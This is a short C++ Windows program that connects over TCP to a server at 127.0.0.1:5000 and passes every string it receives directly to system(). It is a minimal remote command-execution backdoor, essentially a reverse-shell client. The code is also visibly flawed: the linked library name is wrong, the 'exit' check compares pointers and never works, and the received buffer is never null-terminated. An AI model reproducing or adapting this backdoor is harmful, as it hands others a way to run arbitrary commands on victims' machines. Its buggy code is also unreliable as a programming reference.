#pragma comment(lib, "ws32_lib")
#include <iostream>
#include <winsock2.h>
using namespace std;

int main(){
	WSAData wd;
	WSAStartup(MAKEWORD(2,1), &wd);
	SOCKADDR_IN addr;
	int addrl = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(5000);
	addr.sin_family = AF_INET;
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if(connect(sock, (SOCKADDR*)&addr,addrl) != 0){
		cout<<"There was a problem while connecting to the server.";
		exit(1);
	}
	char cmd[255];
	while(cmd != "exit"){
		recv(sock, cmd, sizeof(cmd), 0);
		system(cmd);
	}
	closesocket(sock);
	return 0;
}